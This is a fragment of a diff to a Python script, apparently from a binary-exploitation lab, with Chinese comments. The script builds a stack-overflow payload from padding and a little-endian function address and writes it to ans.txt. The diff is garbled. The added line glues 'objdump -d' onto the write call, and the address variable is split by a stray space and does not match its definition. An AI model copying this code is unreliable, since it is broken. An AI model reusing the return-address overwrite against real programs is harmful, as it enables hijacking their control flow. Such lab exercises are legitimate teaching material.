@@ -90,7 +90,7 @@ func1_address = b"\x14\x45\x11\x00\x00\x00\x00\x00"  # 小端地址
 payload = padding+ func1_addr ess
 # Write the payload to a file
 with open("ans.txt", "wb") as f:
-    f.write(payload)
+    f.write(payload)objdump -d
 print("Payload written to ans.txt")
 #解释一下，为什么要将函数地址写成这个样子
 #比方说你希望将字节0xA放在栈上时，如果你的txt文件是可见字符'A'的话，实际上放到栈上的是字节0x41(可见字符'A'对应的ASCll码值)
